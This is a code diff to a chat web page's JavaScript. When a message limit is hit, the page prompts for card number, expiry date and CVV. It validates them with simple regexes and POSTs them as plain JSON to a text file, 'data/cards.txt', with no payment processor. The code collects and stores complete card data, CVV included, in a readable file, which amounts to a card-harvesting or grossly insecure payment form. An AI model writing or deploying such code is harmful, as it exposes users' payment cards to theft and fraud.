@@ -93,26 +93,50 @@ document.addEventListener('DOMContentLoaded', () => {
         promptElem.innerHTML = `
             You have reached the message limit. Please subscribe to continue chatting.
             <br>
-            <input type="text" id="card-details" placeholder="Enter your card details">
+            <input type="text" id="card-number" placeholder="Card Number">
+            <input type="text" id="exp-date" placeholder="MM/YY">
+            <input type="text" id="cvv" placeholder="CVV">
             <button id="subscribe-button">Subscribe</button>
         `;
         chatBox.appendChild(promptElem);
         chatBox.scrollTop = chatBox.scrollHeight;
 
         document.getElementById('subscribe-button').addEventListener('click', () => {
-            const cardDetails = document.getElementById('card-details').value;
-            saveCardDetails(cardDetails);
+            const cardNumber = document.getElementById('card-number').value.trim();
+            const expDate = document.getElementById('exp-date').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            if (validateCardDetails(cardNumber, expDate, cvv)) {
+                saveCardDetails(cardNumber, expDate, cvv);
+            } else {
+                alert('Invalid card details. Please check and try again.');
+            }
         });
     }
 
-    function saveCardDetails(details) {
+    function validateCardDetails(cardNumber, expDate, cvv) {
+        // Basic validation for demonstration purposes
+        const cardNumberRegex = /^\d{16}$/;
+        const expDateRegex = /^\d{2}\/\d{2}$/;
+        const cvvRegex = /^\d{3}$/;
+
+        return cardNumberRegex.test(cardNumber) && expDateRegex.test(expDate) && cvvRegex.test(cvv);
+    }
+
+    function saveCardDetails(cardNumber, expDate, cvv) {
+        const cardDetails = {
+            cardNumber: cardNumber,
+            expDate: expDate,
+            cvv: cvv
+        };
+
         fetch('data/cards.txt', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ cardDetails: details })
+            body: JSON.stringify(cardDetails)
         }).then(response => {
             if (response.ok) {
-                console.log('Card details saved successfully.');
+                alert('Card details saved successfully.');
             } else {
                 console.error('Failed to save card details.');
             }
